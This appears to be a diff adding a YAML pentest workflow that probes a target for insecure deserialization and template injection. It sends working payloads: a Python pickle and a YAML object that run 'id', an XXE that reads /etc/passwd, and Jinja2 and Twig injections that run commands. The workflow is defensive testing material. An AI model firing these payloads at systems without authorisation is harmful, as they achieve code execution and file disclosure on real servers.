@@ -1,0 +1,88 @@
+# Pentest: Insecure Deserialization & SSTI
+# OWASP A08:2021
+id: pentest_deserialization
+name: Deserialization & SSTI Test
+version: "1.0.0"
+description: Insecure deserialization, server-side template injection
+
+steps:
+  - id: start
+    module: flow.start
+    label: Start
+    params: {}
+    orderIndex: 0
+
+  - id: deser_probes
+    module: http.batch
+    label: Deserialization Probes
+    params:
+      requests:
+        # Java serialized object
+        - method: POST
+          url: "{{target_url}}/api/import"
+          headers: { "Content-Type": "application/x-java-serialized-object" }
+          body: "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg=="
+        # PHP serialized
+        - method: POST
+          url: "{{target_url}}/api/import"
+          headers: { "Content-Type": "application/x-www-form-urlencoded" }
+          body: "data=O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}"
+        # Python pickle
+        - method: POST
+          url: "{{target_url}}/api/import"
+          headers: { "Content-Type": "application/octet-stream" }
+          body: "gASVFgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg=="
+        # YAML deserialization
+        - method: POST
+          url: "{{target_url}}/api/config"
+          headers: { "Content-Type": "application/x-yaml" }
+          body: "!!python/object/apply:os.system ['id']"
+        # XML External Entity (XXE)
+        - method: POST
+          url: "{{target_url}}/api/import"
+          headers: { "Content-Type": "application/xml" }
+          body: '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
+      detect_patterns:
+        - "uid="
+        - "root:"
+        - "ClassNotFoundException"
+        - "unserialize"
+        - "pickle"
+    orderIndex: 1
+
+  - id: ssti_probes
+    module: http.batch
+    label: SSTI Deep Probes
+    params:
+      requests:
+        # Jinja2
+        - { method: GET, url: "{{target_url}}/page?title={{7*'7'}}" }
+        - { method: GET, url: "{{target_url}}/page?title={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}" }
+        # Twig (PHP)
+        - { method: GET, url: "{{target_url}}/page?title={{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}" }
+        # Pug/Jade (Node.js)
+        - { method: GET, url: "{{target_url}}/page?title=#{7*7}" }
+        # ERB (Ruby)
+        - { method: GET, url: "{{target_url}}/page?title=<%= 7*7 %>" }
+      detect_patterns:
+        - "49"
+        - "7777777"
+        - "uid="
+    orderIndex: 2
+
+  - id: analyze
+    module: llm.agent
+    label: Analyze Results
+    params:
+      model: gpt-4o
+      prompt: |
+        Analyze deserialization and SSTI results.
+        Deserialization: ${deser_probes.data}
+        SSTI: ${ssti_probes.data}
+        Output JSON: { "findings": [...], "severity": "...", "summary": "..." }
+    orderIndex: 3
+
+edges:
+  - { source: start, target: deser_probes }
+  - { source: deser_probes, target: ssti_probes }
+  - { source: ssti_probes, target: analyze }
